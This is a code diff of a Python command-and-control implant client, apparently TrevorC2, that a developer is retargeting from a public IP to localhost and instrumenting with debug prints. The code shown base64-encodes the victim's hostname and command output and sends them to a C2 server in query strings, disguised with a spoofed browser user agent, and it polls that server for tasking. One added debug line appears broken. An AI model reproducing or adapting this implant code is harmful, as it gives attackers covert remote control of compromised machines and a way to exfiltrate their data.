@@ -7,7 +7,7 @@
 # CONFIG CONSTANTS:
 
 # site used to communicate with (remote C2bot site)
-SITE_URL = ("http://35.192.50.164")
+SITE_URL = ("http://127.0.0.1")
 
 # THIS IS WHAT PATH WE WANT TO HIT FOR CODE - YOU CAN MAKE THIS ANYTHING EXAMPLE: /index.aspx (note you need to change this as well on trevorc2_server)
 ROOT_PATH_QUERY = ("/")
@@ -109,11 +109,10 @@ def connect_c2bot():
             hostname_send = base64.b64encode(hostname_send).decode('utf-8')
 
             # pipe out stdout and base64 encode it then request via a query string parameter
-            if py == "3":
+            if py == "3":   
                 req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
                 opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie))
                 html = urllib.request.urlopen(req).read()
-                print(html)
                 break
             else:
                 req = urllib.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
@@ -140,6 +139,7 @@ while 1:
             req = urllib.request.Request(SITE_URL + ROOT_PATH_QUERY, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
             opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie))
             html = urllib.request.urlopen(req).read().decode('utf-8')
+            print(req.get_header("sessionid"))
         else:
             req = urllib.Request(SITE_URL + ROOT_PATH_QUERY, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
             opener = urllib.build_opener(urllib.HTTPCookieProcessor(cookie))
@@ -162,6 +162,8 @@ while 1:
                 if py == "3":
                     req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + stdout_value, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
                     opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie))
+                    c = req.headers()
+                    print(c)
                     html = urllib.request.urlopen(req).read()
 
                 else:
